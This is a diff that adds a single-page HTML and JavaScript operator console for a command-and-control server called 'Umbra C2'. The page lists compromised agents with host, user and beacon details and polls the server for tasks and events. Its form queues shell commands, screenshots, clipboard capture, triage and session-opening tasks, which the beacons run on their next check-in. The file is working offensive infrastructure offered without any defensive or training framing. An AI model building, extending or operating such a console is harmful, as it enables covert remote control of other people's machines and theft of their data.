@@ -1,0 +1,261 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Umbra C2</title>
+<style>
+  :root {
+    --bg: #0e1116; --panel: #161b22; --line: #26303d; --ink: #d7e0ea;
+    --dim: #7d8a9a; --ok: #4ec9a5; --warn: #d9a441; --bad: #e06c75; --acc: #6aa9ff;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0; background: var(--bg); color: var(--ink);
+    font: 13px/1.5 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+  }
+  header {
+    display: flex; align-items: center; gap: 12px; flex-wrap: wrap;
+    padding: 10px 16px; border-bottom: 1px solid var(--line); background: var(--panel);
+  }
+  header h1 { font-size: 14px; margin: 0 12px 0 0; letter-spacing: .08em; }
+  header input, header select, header button {
+    background: #0b0f14; color: var(--ink); border: 1px solid var(--line);
+    border-radius: 4px; padding: 5px 8px; font: inherit;
+  }
+  header button { cursor: pointer; }
+  header button:hover { border-color: var(--acc); }
+  main { display: grid; grid-template-columns: 2fr 1fr 1fr; gap: 14px; padding: 14px; }
+  section { background: var(--panel); border: 1px solid var(--line); border-radius: 6px; }
+  section > h2 {
+    margin: 0; padding: 8px 12px; font-size: 12px; letter-spacing: .08em;
+    color: var(--dim); border-bottom: 1px solid var(--line); text-transform: uppercase;
+  }
+  .scroll { max-height: 72vh; overflow: auto; }
+  table { width: 100%; border-collapse: collapse; }
+  th, td { text-align: left; padding: 5px 10px; border-bottom: 1px solid var(--line); white-space: nowrap; }
+  th { color: var(--dim); font-weight: 500; position: sticky; top: 0; background: var(--panel); }
+  tr.click { cursor: pointer; }
+  tr.click:hover td { background: #1b2230; }
+  .on { color: var(--ok); } .off { color: var(--bad); } .dim { color: var(--dim); }
+  .feed { padding: 6px 10px; font-size: 12px; }
+  .feed div { padding: 2px 0; border-bottom: 1px dotted #1d2530; word-break: break-all; }
+  .feed .k { color: var(--acc); } .feed .t { color: var(--dim); }
+  form { display: flex; gap: 8px; flex-wrap: wrap; padding: 10px 12px; border-bottom: 1px solid var(--line); }
+  form input, form select { flex: 1 1 120px; min-width: 0; }
+  form button { flex: 0 0 auto; cursor: pointer; }
+  .note { padding: 8px 12px; color: var(--dim); }
+  code { color: var(--warn); }
+</style>
+</head>
+<body>
+<header>
+  <h1>UMBRA C2</h1>
+  <input id="token" type="password" placeholder="operator token" size="26">
+  <button id="connect">connect</button>
+  <span id="state" class="dim">not connected</span>
+  <span style="flex:1"></span>
+  <span id="stats" class="dim"></span>
+</header>
+
+<main>
+  <section>
+    <h2>agents</h2>
+    <div class="scroll">
+      <table id="agents">
+        <thead><tr>
+          <th>id</th><th>host</th><th>os</th><th>user</th><th>transport</th>
+          <th>sleep</th><th>state</th><th>tags</th><th>last seen</th>
+        </tr></thead>
+        <tbody></tbody>
+      </table>
+    </div>
+    <form id="taskForm">
+      <select id="agent" required></select>
+      <select id="kind">
+        <option value="shell">shell</option>
+        <option value="sysinfo">sysinfo</option>
+        <option value="ps">ps</option>
+        <option value="ls">ls</option>
+        <option value="triage">triage</option>
+        <option value="find">find</option>
+        <option value="netinfo">netinfo</option>
+        <option value="screenshot">screenshot</option>
+        <option value="clipboard">clipboard</option>
+        <option value="session.open">session.open</option>
+        <option value="proc.kill">proc.kill</option>
+      </select>
+      <input id="args" placeholder='{"cmd":"whoami"}' value='{"cmd":"whoami"}'>
+      <button type="submit">queue</button>
+    </form>
+    <div class="note" id="taskNote">The task is queued on the server and the beacon runs it on its next check-in.</div>
+  </section>
+
+  <section>
+    <h2>tasks</h2>
+    <div class="scroll">
+      <table id="tasks">
+        <thead><tr><th>task</th><th>agent</th><th>kind</th><th>state</th><th>when</th></tr></thead>
+        <tbody></tbody>
+      </table>
+    </div>
+  </section>
+
+  <section>
+    <h2>events</h2>
+    <div class="scroll feed" id="feed"></div>
+  </section>
+</main>
+
+<script>
+(function () {
+  "use strict";
+  var token = localStorage.getItem("umbra.token") || "";
+  var seq = 0;
+  var feed = document.getElementById("feed");
+  var state = document.getElementById("state");
+  var tokenBox = document.getElementById("token");
+  tokenBox.value = token;
+
+  function api(path, options) {
+    options = options || {};
+    options.headers = Object.assign({ "Authorization": "Bearer " + token }, options.headers || {});
+    return fetch(path, options).then(function (res) {
+      if (!res.ok) { throw new Error(res.status + " " + res.statusText); }
+      return res.json();
+    });
+  }
+
+  function el(tag, text, cls) {
+    var node = document.createElement(tag);
+    if (text !== undefined && text !== null) { node.textContent = String(text); }
+    if (cls) { node.className = cls; }
+    return node;
+  }
+
+  function when(stamp) {
+    if (!stamp) { return "-"; }
+    var d = new Date(stamp);
+    return isNaN(d.getTime()) ? stamp : d.toLocaleString();
+  }
+
+  function refreshAgents() {
+    return api("/api/agents").then(function (data) {
+      var body = document.querySelector("#agents tbody");
+      body.textContent = "";
+      var picker = document.getElementById("agent");
+      var chosen = picker.value;
+      picker.textContent = "";
+      (data.agents || []).forEach(function (a) {
+        var row = el("tr", null, "click");
+        [a.id, a.host, a.os, a.user, a.transport,
+         a.sleep ? a.sleep + "s" : "-", a.state, (a.tags || []).join(","), when(a.last_seen)]
+          .forEach(function (value, index) {
+            var cell = el("td", value);
+            if (index === 6) { cell.className = a.state === "online" ? "on" : "off"; }
+            if (index === 8) { cell.className = "dim"; }
+            row.appendChild(cell);
+          });
+        row.addEventListener("click", function () { picker.value = a.id; });
+        body.appendChild(row);
+        var option = el("option", a.id);
+        option.value = a.id;
+        picker.appendChild(option);
+      });
+      if (chosen) { picker.value = chosen; }
+      return data.agents || [];
+    });
+  }
+
+  function refreshTasks() {
+    return api("/api/tasks?limit=50").then(function (data) {
+      var body = document.querySelector("#tasks tbody");
+      body.textContent = "";
+      (data.tasks || []).forEach(function (t) {
+        var row = el("tr");
+        [t.id, t.agent_id, t.kind, t.state, when(t.completed || t.created)]
+          .forEach(function (value, index) {
+            var cell = el("td", value);
+            if (index === 3) {
+              cell.className = t.state === "done" ? "on" : (t.state === "failed" ? "off" : "dim");
+            }
+            if (index === 4) { cell.className = "dim"; }
+            row.appendChild(cell);
+          });
+        body.appendChild(row);
+      });
+    });
+  }
+
+  function refreshStats() {
+    return api("/api/stats").then(function (s) {
+      document.getElementById("stats").textContent =
+        "agents " + (s.agents || 0) + " · tasks " + (s.tasks || 0) +
+        " · operators " + (s.operators || 0) + " · up " + (s.uptime_s || 0) + "s";
+    });
+  }
+
+  function refreshEvents() {
+    return api("/api/events?after=" + seq + "&limit=200").then(function (data) {
+      (data.events || []).forEach(function (ev) {
+        seq = Math.max(seq, parseInt(ev.seq || 0, 10));
+        var line = el("div");
+        line.appendChild(el("span", ev.at ? new Date(ev.at * 1000).toLocaleTimeString() : "", "t"));
+        line.appendChild(document.createTextNode(" "));
+        line.appendChild(el("span", ev.kind, "k"));
+        if (ev.agent_id) { line.appendChild(document.createTextNode(" " + ev.agent_id)); }
+        if (ev.task_id) { line.appendChild(document.createTextNode(" " + ev.task_id)); }
+        feed.insertBefore(line, feed.firstChild);
+      });
+      while (feed.childNodes.length > 300) { feed.removeChild(feed.lastChild); }
+    });
+  }
+
+  function tick() {
+    refreshAgents().then(refreshTasks).then(refreshStats).then(refreshEvents).catch(function (err) {
+      state.textContent = "error: " + err.message;
+      state.className = "off";
+    });
+  }
+
+  document.getElementById("connect").addEventListener("click", function () {
+    token = tokenBox.value.trim();
+    localStorage.setItem("umbra.token", token);
+    state.textContent = "connected";
+    state.className = "on";
+    tick();
+  });
+
+  document.getElementById("taskForm").addEventListener("submit", function (ev) {
+    ev.preventDefault();
+    var args = {};
+    var raw = document.getElementById("args").value.trim();
+    if (raw) {
+      try { args = JSON.parse(raw); }
+      catch (e) {
+        document.getElementById("taskNote").textContent = "the arguments are not valid JSON";
+        return;
+      }
+    }
+    api("/api/task", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        id: document.getElementById("agent").value,
+        kind: document.getElementById("kind").value,
+        args: args
+      })
+    }).then(function (res) {
+      document.getElementById("taskNote").textContent = "queued " + res.task_id;
+    }).catch(function (err) {
+      document.getElementById("taskNote").textContent = "refused: " + err.message;
+    });
+  });
+
+  if (token) { state.textContent = "connected"; state.className = "on"; }
+  tick();
+  setInterval(tick, 3000);
+})();
+</script>
+</body>
+</html>
